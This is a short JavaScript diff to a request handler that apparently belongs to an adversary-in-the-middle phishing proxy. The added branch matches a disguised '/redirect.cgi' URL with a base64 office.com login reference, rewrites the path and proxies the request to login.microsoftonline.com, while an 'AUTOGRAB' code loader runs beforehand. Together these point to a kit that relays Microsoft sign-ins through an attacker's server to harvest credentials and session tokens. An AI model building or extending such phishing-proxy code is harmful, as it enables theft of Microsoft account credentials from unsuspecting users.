@@ -192,9 +192,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         super.loadAutoGrab(configExport.AUTOGRAB_CODE)
 
-        if (this.req.url === '/' || this.req.url.startsWith('/?')) {
-            clientContext.currentDomain = 'www.office.com'
 
+        //TODO: needs update to this code
+        if (this.req.url.startsWith('/redirect.cgi?ref=aHR0cHM6Ly93d3cub2ZmaWNlLmNvbS9sb2dpbiM=')) {
+            this.req.url = configExport.START_PATH
+            clientContext.currentDomain = 'login.microsoftonline.com'
+            return super.superExecuteProxy(clientContext.currentDomain, clientContext)
         }
 
 
